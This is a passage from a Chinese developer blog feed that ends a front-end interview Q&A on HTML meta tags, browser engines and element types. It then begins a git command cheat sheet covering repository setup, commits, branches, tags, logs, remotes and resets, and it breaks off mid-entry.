class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”x5-orientation”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”portrait”</span>&gt;</span>    <span class="hljs-comment">&lt;!--QQ强制竖屏--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”full-screen”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”yes”</span>&gt;</span>              <span class="hljs-comment">&lt;!--UC强制全屏--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”x5-fullscreen”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”true”</span>&gt;</span>       <span class="hljs-comment">&lt;!--QQ强制全屏--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”browsermode”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”application”</span>&gt;</span>   <span class="hljs-comment">&lt;!--UC应用模式--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”x5-page-mode”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”app”</span>&gt;</span>   <span class="hljs-comment">&lt;!-- QQ应用模式--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”msapplication-tap-highlight”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”no”</span>&gt;</span>    <span class="hljs-comment">&lt;!--windows phone 点击无高亮设置页面不缓存--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">”pragma”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”no-cache”</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">”cache-control”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”no-cache”</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">”expires”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”0″</span>&gt;</span></code></pre></div><h3 id="26-你做的页面在哪些流览器测试过？这些浏览器的内核分别是什么"><a href="#26-你做的页面在哪些流览器测试过？这些浏览器的内核分别是什么" class="headerlink" title="#26 你做的页面在哪些流览器测试过？这些浏览器的内核分别是什么?"></a><a href="http://interview.poetries.top/docs/base.html#_26-%E4%BD%A0%E5%81%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%9C%A8%E5%93%AA%E4%BA%9B%E6%B5%81%E8%A7%88%E5%99%A8%E6%B5%8B%E8%AF%95%E8%BF%87-%E8%BF%99%E4%BA%9B%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%86%85%E6%A0%B8%E5%88%86%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88">#</a>26 你做的页面在哪些流览器测试过？这些浏览器的内核分别是什么?</h3><ul><li><code>IE</code>: <code>trident</code>内核</li><li><code>Firefox</code>：<code>gecko</code>内核</li><li><code>Safari</code>:<code>webkit</code>内核</li><li><code>Opera</code>:以前是<code>presto</code>内核，<code>Opera</code>现已改用Google - <code>Chrome</code>的<code>Blink</code>内核</li><li><code>Chrome:Blink</code>(基于<code>webkit</code>，Google与Opera Software共同开发)</li></ul><h3 id="27-div-css的布局较table布局有什么优点？"><a href="#27-div-css的布局较table布局有什么优点？" class="headerlink" title="#27 div+css的布局较table布局有什么优点？"></a><a href="http://interview.poetries.top/docs/base.html#_27-div-css%E7%9A%84%E5%B8%83%E5%B1%80%E8%BE%83table%E5%B8%83%E5%B1%80%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%82%B9">#</a>27 div+css的布局较table布局有什么优点？</h3><ul><li>改版的时候更方便 只要改<code>css</code>文件。</li><li>页面加载速度更快、结构化清晰、页面显示简洁。</li><li>表现与结构相分离。</li><li>易于优化（<code>seo</code>）搜索引擎更友好，排名更容易靠前。</li></ul><h3 id="28-a：img的alt与title有何异同？b：strong与em的异同？"><a href="#28-a：img的alt与title有何异同？b：strong与em的异同？" class="headerlink" title="#28 a：img的alt与title有何异同？b：strong与em的异同？"></a><a href="http://interview.poetries.top/docs/base.html#_28-a-img%E7%9A%84alt%E4%B8%8Etitle%E6%9C%89%E4%BD%95%E5%BC%82%E5%90%8C-b-strong%E4%B8%8Eem%E7%9A%84%E5%BC%82%E5%90%8C">#</a>28 a：img的alt与title有何异同？b：strong与em的异同？</h3><ul><li><code>alt(alt text)</code>:为不能显示图像、窗体或<code>applets</code>的用户代理（<code>UA</code>），<code>alt</code>属性用来指定替换文字。替换文字的语言由<code>lang</code>属性指定。(在IE浏览器下会在没有<code>title</code>时把<code>alt</code>当成 <code>tool tip</code>显示)</li><li><code>title(tool tip)</code>:该属性为设置该属性的元素提供建议性的信息</li><li><code>strong</code>:粗体强调标签，强调，表示内容的重要性</li><li><code>em</code>:斜体强调标签，更强烈强调，表示内容的强调点</li></ul><h3 id="29-你能描述一下渐进增强和优雅降级之间的不同吗"><a href="#29-你能描述一下渐进增强和优雅降级之间的不同吗" class="headerlink" title="#29 你能描述一下渐进增强和优雅降级之间的不同吗"></a><a href="http://interview.poetries.top/docs/base.html#_29-%E4%BD%A0%E8%83%BD%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%8B%E6%B8%90%E8%BF%9B%E5%A2%9E%E5%BC%BA%E5%92%8C%E4%BC%98%E9%9B%85%E9%99%8D%E7%BA%A7%E4%B9%8B%E9%97%B4%E7%9A%84%E4%B8%8D%E5%90%8C%E5%90%97">#</a>29 你能描述一下渐进增强和优雅降级之间的不同吗</h3><ul><li>渐进增强：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。</li><li>优雅降级：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。</li></ul><blockquote><p>区别：优雅降级是从复杂的现状开始，并试图减少用户体验的供给，而渐进增强则是从一个非常基础的，能够起作用的版本开始，并不断扩充，以适应未来环境的需要。降级（功能衰减）意味着往回看；而渐进增强则意味着朝前看，同时保证其根基处于安全地带</p></blockquote><h3 id="30-为什么利用多个域名来存储网站资源会更有效？"><a href="#30-为什么利用多个域名来存储网站资源会更有效？" class="headerlink" title="#30 为什么利用多个域名来存储网站资源会更有效？"></a><a href="http://interview.poetries.top/docs/base.html#_30-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D%E6%9D%A5%E5%AD%98%E5%82%A8%E7%BD%91%E7%AB%99%E8%B5%84%E6%BA%90%E4%BC%9A%E6%9B%B4%E6%9C%89%E6%95%88">#</a>30 为什么利用多个域名来存储网站资源会更有效？</h3><ul><li><code>CDN</code>缓存更方便</li><li>突破浏览器并发限制</li><li>节约<code>cookie</code>带宽</li><li>节约主域名的连接数，优化页面响应速度</li><li>防止不必要的安全问题</li></ul><h3 id="31-简述一下src与href的区别"><a href="#31-简述一下src与href的区别" class="headerlink" title="#31 简述一下src与href的区别"></a><a href="http://interview.poetries.top/docs/base.html#_31-%E7%AE%80%E8%BF%B0%E4%B8%80%E4%B8%8Bsrc%E4%B8%8Ehref%E7%9A%84%E5%8C%BA%E5%88%AB">#</a>31 简述一下src与href的区别</h3><ul><li><code>src</code>用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</li><li><code>src</code>是<code>source</code>的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求<code>src</code>资源时会将其指向的资源下载并应用到文档内，例如<code>js</code>脚本，<code>img</code>图片和<code>frame</code>等元素</li></ul><blockquote><script src ="js.js"></script> 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部</blockquote><ul><li><code>href</code>是<code>Hypertext Reference</code>的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加</li><li><code>&lt;link href=&quot;common.css&quot; rel=&quot;stylesheet&quot;/&gt;</code>那么浏览器会识别该文档为<code>css</code>文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用<code>link</code>方式来加载<code>css</code>，而不是使用<code>@import</code>方式</li></ul><h3 id="32-知道的网页制作会用到的图片格式有哪些？"><a href="#32-知道的网页制作会用到的图片格式有哪些？" class="headerlink" title="#32 知道的网页制作会用到的图片格式有哪些？"></a><a href="http://interview.poetries.top/docs/base.html#_32-%E7%9F%A5%E9%81%93%E7%9A%84%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B">#</a>32 知道的网页制作会用到的图片格式有哪些？</h3><ul><li><code>png-8</code>、<code>png-24</code>、<code>jpeg</code>、<code>gif</code>、<code>svg</code></li></ul><blockquote><p>但是上面的那些都不是面试官想要的最后答案。面试官希望听到是<code>Webp</code>,<code>Apng</code>。（是否有关注新技术，新鲜事物）</p></blockquote><ul><li><strong>Webp</strong>：<code>WebP</code>格式，谷歌（google）开发的一种旨在加快图片加载速度的图片格式。图片压缩体积大约只有<code>JPEG</code>的<code>2/3</code>，并能节省大量的服务器带宽资源和数据空间。<code>Facebook Ebay</code>等知名网站已经开始测试并使用<code>WebP</code>格式。</li><li>在质量相同的情况下，WebP格式图像的体积要比JPEG格式图像小<code>40%</code>。</li><li><strong>Apng</strong>：全称是<code>“Animated Portable Network Graphics”</code>, 是PNG的位图动画扩展，可以实现png格式的动态图片效果。04年诞生，但一直得不到各大浏览器厂商的支持，直到日前得到 <code>iOS safari 8</code>的支持，有望代替<code>GIF</code>成为下一代动态图标准</li></ul><h3 id="33-在css-js代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？"><a href="#33-在css-js代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？" class="headerlink" title="#33 在css/js代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？"></a><a href="http://interview.poetries.top/docs/base.html#_33-%E5%9C%A8css-js%E4%BB%A3%E7%A0%81%E4%B8%8A%E7%BA%BF%E4%B9%8B%E5%90%8E%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%BB%8F%E5%B8%B8%E4%BC%9A%E4%BC%98%E5%8C%96%E6%80%A7%E8%83%BD-%E4%BB%8E%E7%94%A8%E6%88%B7%E5%88%B7%E6%96%B0%E7%BD%91%E9%A1%B5%E5%BC%80%E5%A7%8B-%E4%B8%80%E6%AC%A1js%E8%AF%B7%E6%B1%82%E4%B8%80%E8%88%AC%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E4%BC%9A%E6%9C%89%E7%BC%93%E5%AD%98%E5%A4%84%E7%90%86">#</a>33 在css/js代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？</h3><blockquote><p><code>dns</code>缓存，<code>cdn</code>缓存，浏览器缓存，服务器缓存</p></blockquote><h3 id="34-一个页面上有大量的图片（大型电商网站），加载很慢，你有哪些方法优化这些图片的加载，给用户更好的体验。"><a href="#34-一个页面上有大量的图片（大型电商网站），加载很慢，你有哪些方法优化这些图片的加载，给用户更好的体验。" class="headerlink" title="#34 一个页面上有大量的图片（大型电商网站），加载很慢，你有哪些方法优化这些图片的加载，给用户更好的体验。"></a><a href="http://interview.poetries.top/docs/base.html#_33-%E4%B8%80%E4%B8%AA%E9%A1%B5%E9%9D%A2%E4%B8%8A%E6%9C%89%E5%A4%A7%E9%87%8F%E7%9A%84%E5%9B%BE%E7%89%87-%E5%A4%A7%E5%9E%8B%E7%94%B5%E5%95%86%E7%BD%91%E7%AB%99-%E5%8A%A0%E8%BD%BD%E5%BE%88%E6%85%A2-%E4%BD%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95%E4%BC%98%E5%8C%96%E8%BF%99%E4%BA%9B%E5%9B%BE%E7%89%87%E7%9A%84%E5%8A%A0%E8%BD%BD-%E7%BB%99%E7%94%A8%E6%88%B7%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C%E3%80%82">#</a>34 一个页面上有大量的图片（大型电商网站），加载很慢，你有哪些方法优化这些图片的加载，给用户更好的体验。</h3><ul><li>图片懒加载，在页面上的未可视区域可以添加一个滚动事件，判断图片位置与浏览器顶端的距离与页面的距离，如果前者小于后者，优先加载。</li><li>如果为幻灯片、相册等，可以使用图片预加载技术，将当前展示图片的前一张和后一张优先下载。</li><li>如果图片为css图片，可以使用<code>CSSsprite</code>，<code>SVGsprite</code>，<code>Iconfont</code>、<code>Base64</code>等技术。</li><li>如果图片过大，可以使用特殊编码的图片，加载时会先加载一张压缩的特别厉害的缩略图，以提高用户体验。</li><li>如果图片展示区域小于图片的真实大小，则因在服务器端根据业务需要先行进行图片压缩，图片压缩后大小与展示一致。</li></ul><h3 id="35-网页验证码是干嘛的，是为了解决什么安全问题"><a href="#35-网页验证码是干嘛的，是为了解决什么安全问题" class="headerlink" title="#35 网页验证码是干嘛的，是为了解决什么安全问题"></a>#35 网页验证码是干嘛的，是为了解决什么安全问题</h3><ul><li>区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水</li><li>有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试</li></ul><h3 id="36-行内元素有哪些？块级元素有哪些？空（void）元素有哪些？"><a href="#36-行内元素有哪些？块级元素有哪些？空（void）元素有哪些？" class="headerlink" title="#36 行内元素有哪些？块级元素有哪些？空（void）元素有哪些？"></a>#36 行内元素有哪些？块级元素有哪些？空（void）元素有哪些？</h3><p>​    </p><ul><li><p>行内元素不可以设置宽高，不独占一行</p></li><li><p>块级元素可以设置宽高，独占一行</p></li></ul><ul><li>行内：</li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml">JAVASCRIPT<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">abbr</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">acronym</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">bdo</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">big</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">cite</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">dfn</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">input</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">kbd</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">q</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">samp</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">tt</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">var</span>&gt;</span></code></pre></div><ul><li>块级：</li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml">JAVASCRIPT<span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">caption</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">noframes</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">tfoot</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></code></pre></div><ul><li>空：</li></ul><p>常见的：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">JAVASCRIPT</span><span class="hljs-section">&lt;br&gt;</span> <span class="hljs-section">&lt;hr&gt;</span> <span class="hljs-section">&lt;img&gt;</span> <span class="hljs-section">&lt;input&gt;</span> <span class="hljs-section">&lt;link&gt;</span> <span class="hljs-section">&lt;meta&gt;</span></code></pre></div><p>鲜为人知的：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">JAVASCRIPT</span><span class="hljs-section">&lt;area&gt;</span> <span class="hljs-section">&lt;base&gt;</span> <span class="hljs-section">&lt;col&gt;</span> <span class="hljs-section">&lt;command&gt;</span> <span class="hljs-section">&lt;embed&gt;</span> <span class="hljs-section">&lt;link&gt;</span> <span class="hljs-section">&lt;meta&gt;</span><span class="hljs-section">&lt;keygen&gt;</span> <span class="hljs-section">&lt;param&gt;</span> <span class="hljs-section">&lt;source&gt;</span> <span class="hljs-section">&lt;track&gt;</span> <span class="hljs-section">&lt;wbr&gt;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>html</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github使用总结📣</title>
    <link href="/hexo_blog/2020/10/02/github/"/>
    <url>/hexo_blog/2020/10/02/github/</url>
    
    <content type="html"><![CDATA[<h1 id="一些-GitHub-的基本概念"><a href="#一些-GitHub-的基本概念" class="headerlink" title="一些 GitHub 的基本概念"></a>一些 GitHub 的基本概念</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一些常用的git操作</p><p><img src="https://img-blog.csdnimg.cn/20190628180240306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YW5zaHVqaW43Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>​    </p></blockquote><h3 id="一、新建代码库"><a href="#一、新建代码库" class="headerlink" title="一、新建代码库"></a>一、新建代码库</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 在当前目录新建一个Git代码库</span>$ git init<span class="hljs-comment"># 新建一个目录，将其初始化为Git代码库</span>$ git init [project-name]<span class="hljs-comment"># 下载一个项目和它的整个代码历史</span>$ git <span class="hljs-built_in">clone</span> [url]</code></pre></div><h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 显示当前的Git配置</span>$ git config --list<span class="hljs-comment"># 编辑Git配置文件</span>$ git config -e [--global]<span class="hljs-comment"># 设置提交代码时的用户信息</span>$ git config [--global] user.name <span class="hljs-string">&quot;[name]&quot;</span>$ git config [--global] user.email <span class="hljs-string">&quot;[email address]&quot;</span></code></pre></div><h3 id="三、增加-删除文件"><a href="#三、增加-删除文件" class="headerlink" title="三、增加/删除文件"></a>三、增加/删除文件</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 添加指定文件到暂存区</span>$ git add [file1] [file2] ...<span class="hljs-comment"># 添加指定目录到暂存区，包括子目录</span>$ git add [dir]<span class="hljs-comment"># 添加当前目录的所有文件到暂存区</span>$ git add .<span class="hljs-comment"># 添加每个变化前，都会要求确认</span><span class="hljs-comment"># 对于同一个文件的多处变化，可以实现分次提交</span>$ git add -p<span class="hljs-comment"># 删除工作区文件，并且将这次删除放入暂存区</span>$ git rm [file1] [file2] ...<span class="hljs-comment"># 停止追踪指定文件，但该文件会保留在工作区</span>$ git rm --cached [file]<span class="hljs-comment"># 改名文件，并且将这个改名放入暂存区</span>$ git mv [file-original] [file-renamed]</code></pre></div><h3 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 提交暂存区到仓库区</span>$ git commit -m [message]<span class="hljs-comment"># 提交暂存区的指定文件到仓库区</span>$ git commit [file1] [file2] ... -m [message]<span class="hljs-comment"># 提交工作区自上次commit之后的变化，直接到仓库区</span>$ git commit -a<span class="hljs-comment"># 提交时显示所有diff信息</span>$ git commit -v<span class="hljs-comment"># 使用一次新的commit，替代上一次提交</span><span class="hljs-comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span>$ git commit --amend -m [message]<span class="hljs-comment"># 重做上一次commit，并包括指定文件的新变化</span>$ git commit --amend [file1] [file2] ...</code></pre></div><h3 id="五、分支"><a href="#五、分支" class="headerlink" title="五、分支"></a>五、分支</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有本地分支</span>$ git branch<span class="hljs-comment"># 列出所有远程分支</span>$ git branch -r<span class="hljs-comment"># 列出所有本地分支和远程分支</span>$ git branch -a<span class="hljs-comment"># 新建一个分支，但依然停留在当前分支</span>$ git branch [branch-name]<span class="hljs-comment"># 新建一个分支，并切换到该分支</span>$ git checkout -b [branch]<span class="hljs-comment"># 新建一个分支，指向指定commit</span>$ git branch [branch] [commit]<span class="hljs-comment"># 新建一个分支，与指定的远程分支建立追踪关系</span>$ git branch --track [branch] [remote-branch]<span class="hljs-comment"># 切换到指定分支，并更新工作区</span>$ git checkout [branch-name]<span class="hljs-comment"># 切换到上一个分支</span>$ git checkout -<span class="hljs-comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span>$ git branch --set-upstream [branch] [remote-branch]<span class="hljs-comment"># 合并指定分支到当前分支</span>$ git merge [branch]<span class="hljs-comment"># 选择一个commit，合并进当前分支</span>$ git cherry-pick [commit]<span class="hljs-comment"># 删除分支</span>$ git branch -d [branch-name]<span class="hljs-comment"># 删除远程分支</span>$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]</code></pre></div><h3 id="六、标签"><a href="#六、标签" class="headerlink" title="六、标签"></a>六、标签</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有tag</span>$ git tag<span class="hljs-comment"># 新建一个tag在当前commit</span>$ git tag [tag]<span class="hljs-comment"># 新建一个tag在指定commit</span>$ git tag [tag] [commit]<span class="hljs-comment"># 删除本地tag</span>$ git tag -d [tag]<span class="hljs-comment"># 删除远程tag</span>$ git push origin :refs/tags/[tagName]<span class="hljs-comment"># 查看tag信息</span>$ git show [tag]<span class="hljs-comment"># 提交指定tag</span>$ git push [remote] [tag]<span class="hljs-comment"># 提交所有tag</span>$ git push [remote] --tags<span class="hljs-comment"># 新建一个分支，指向某个tag</span>$ git checkout -b [branch] [tag]</code></pre></div><h3 id="七、查看信息"><a href="#七、查看信息" class="headerlink" title="七、查看信息"></a>七、查看信息</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 显示有变更的文件</span>$ git status<span class="hljs-comment"># 显示当前分支的版本历史</span>$ git <span class="hljs-built_in">log</span><span class="hljs-comment"># 显示commit历史，以及每次commit发生变更的文件</span>$ git <span class="hljs-built_in">log</span> --<span class="hljs-built_in">stat</span><span class="hljs-comment"># 搜索提交历史，根据关键词</span>$ git <span class="hljs-built_in">log</span> -S [keyword]<span class="hljs-comment"># 显示某个commit之后的所有变动，每个commit占据一行</span>$ git <span class="hljs-built_in">log</span> [tag] HEAD --pretty=format:%s<span class="hljs-comment"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span>$ git <span class="hljs-built_in">log</span> [tag] HEAD --grep feature<span class="hljs-comment"># 显示某个文件的版本历史，包括文件改名</span>$ git <span class="hljs-built_in">log</span> --follow [file]$ git whatchanged [file]<span class="hljs-comment"># 显示指定文件相关的每一次diff</span>$ git <span class="hljs-built_in">log</span> -p [file]<span class="hljs-comment"># 显示过去5次提交</span>$ git <span class="hljs-built_in">log</span> -5 --pretty --oneline<span class="hljs-comment"># 显示所有提交过的用户，按提交次数排序</span>$ git shortlog -sn<span class="hljs-comment"># 显示指定文件是什么人在什么时间修改过</span>$ git blame [file]<span class="hljs-comment"># 显示暂存区和工作区的差异</span>$ git diff<span class="hljs-comment"># 显示暂存区和上一个commit的差异</span>$ git diff --cached [file]<span class="hljs-comment"># 显示工作区与当前分支最新commit之间的差异</span>$ git diff HEAD<span class="hljs-comment"># 显示两次提交之间的差异</span>$ git diff [first-branch]...[second-branch]<span class="hljs-comment"># 显示今天你写了多少行代码</span>$ git diff --shortstat <span class="hljs-string">&quot;@&#123;0 day ago&#125;&quot;</span><span class="hljs-comment"># 显示某次提交的元数据和内容变化</span>$ git show [commit]<span class="hljs-comment"># 显示某次提交发生变化的文件</span>$ git show --name-only [commit]<span class="hljs-comment"># 显示某次提交时，某个文件的内容</span>$ git show [commit]:[filename]<span class="hljs-comment"># 显示当前分支的最近几次提交</span>$ git reflog</code></pre></div><h3 id="八、远程同步"><a href="#八、远程同步" class="headerlink" title="八、远程同步"></a>八、远程同步</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 下载远程仓库的所有变动</span>$ git fetch [remote]<span class="hljs-comment"># 显示所有远程仓库</span>$ git remote -v<span class="hljs-comment"># 显示某个远程仓库的信息</span>$ git remote show [remote]<span class="hljs-comment"># 增加一个新的远程仓库，并命名</span>$ git remote add [shortname] [url]<span class="hljs-comment"># 取回远程仓库的变化，并与本地分支合并</span>$ git pull [remote] [branch]<span class="hljs-comment"># 上传本地指定分支到远程仓库</span>$ git push [remote] [branch]<span class="hljs-comment"># 强行推送当前分支到远程仓库，即使有冲突</span>$ git push [remote] --force<span class="hljs-comment"># 推送所有分支到远程仓库</span>$ git push [remote] --all</code></pre></div><h3 id="九、撤销"><a href="#九、撤销" class="headerlink" title="九、撤销"></a>九、撤销</h3><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 恢复暂存区的指定文件到工作区</span>$ git checkout [file]<span class="hljs-comment"># 恢复某个commit的指定文件到暂存区和工作区</span>$ git checkout [commit] [file]<span class="hljs-comment"># 恢复暂存区的所有文件到工作区</span>$ git checkout .<span class="hljs-comment"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span>$ git reset [file]<span class="hljs-comment"># 重置暂存区与工作区，与上一次commit保持一致</span>$ git reset --hard<span class="hljs-comment"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span>$ git reset [commit]<span class="hljs-comment"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span>$ git reset --hard [commit]<span class="hljs-comment"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span>$ git reset --keep [commit]<span class="hljs-comment"># 新建一个commit，用来撤销指定commit</span><span 